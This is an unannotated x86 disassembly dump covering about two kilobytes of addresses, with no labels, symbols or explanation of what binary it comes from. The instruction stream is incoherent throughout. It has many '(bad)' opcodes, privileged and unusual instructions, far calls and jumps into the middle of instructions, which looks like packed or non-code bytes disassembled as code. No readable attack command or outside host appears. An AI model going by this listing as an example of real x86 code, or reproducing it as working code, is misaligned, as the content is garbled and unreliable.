  4102f1:	call   0xbd3dfc81
  4102f6:	cmp    al,0x9b
  4102f8:	add    BYTE PTR [edx],dh
  4102fa:	mov    bx,di
  4102fd:	call   0x8b49808d
  410302:	add    ebp,esp
  410304:	mov    bx,di
  410307:	jnp    0x41032f
  410309:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  41030f:	mov    eax,DWORD PTR [eax]
  410311:	call   0x7c3c8e7c
  410316:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  41031c:	data16 data16 fistp WORD PTR [ebp+0xe]
  410321:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  41032b:	fisttp WORD PTR [ecx-0x7401f77b]
  410331:	(bad)  
  410332:	cld    
  410333:	jne    0x410371
  410335:	xor    eax,DWORD PTR [eax]
  410337:	mov    esp,DWORD PTR [esi-0x10]
  41033a:	sti    
  41033b:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  410342:	data16 adc bl,bh
  410345:	push   ebp
  410346:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  41034d:	mov    WORD PTR [eax],es
  41034f:	fwait
  410350:	data16 xor bh,bl
  410353:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  410359:	mov    esp,DWORD PTR [esi-0x14]
  41035c:	fisttp WORD PTR [ebx-0x3748a9f2]
  410362:	or     al,0x2b
  410364:	mov    bh,0xba
  410366:	hlt    
  410367:	mov    bh,bl
  410369:	add    BYTE PTR [ecx-0x7446f3cd],cl
  41036f:	dec    esi
  410370:	or     al,0x0
  410372:	mov    edi,DWORD PTR [ebx]
  410374:	or     BYTE PTR [ebp+0x3b],dh
  410377:	mov    ecx,DWORD PTR [edi]
  410379:	fdivr  QWORD PTR [ebx-0x7499ff83]
  41037f:	xor    al,0xd8
  410381:	pop    bp
  410383:	lock xor esi,DWORD PTR [ebx]
  410386:	lea    esp,[esi+0x1f]
  410389:	icebp  
  41038a:	jb     0x410390
  41038c:	add    al,al
  41038e:	jge    0x41039c
  410390:	mov    eax,eax
  410392:	fsubr  st,st(3)
  410394:	pop    ebp
  410395:	mov    esi,DWORD PTR [ebx]
  410397:	in     al,0x8d
  410399:	rcr    DWORD PTR [edi],0xc2
  41039c:	jb     0x4103fc
  41039e:	add    cl,cl
  4103a0:	jge    0x4103ae
  4103a2:	mov    edx,DWORD PTR [ebp-0x20]
  4103a5:	in     al,dx
  4103a6:	pop    ebp
  4103a7:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4103ac:	cmp    di,WORD PTR [ebp+0x0]
  4103b0:	mov    ebp,DWORD PTR [ebx]
  4103b2:	fdivr  QWORD PTR [esi+0x668a5d]
  4103b8:	cmp    al,0x33
  4103ba:	mov    si,0x4e7d
  4103be:	mov    eax,DWORD PTR [eax]
  4103c0:	lock inc ebp
  4103c2:	mov    esi,DWORD PTR [eax]
  4103c4:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
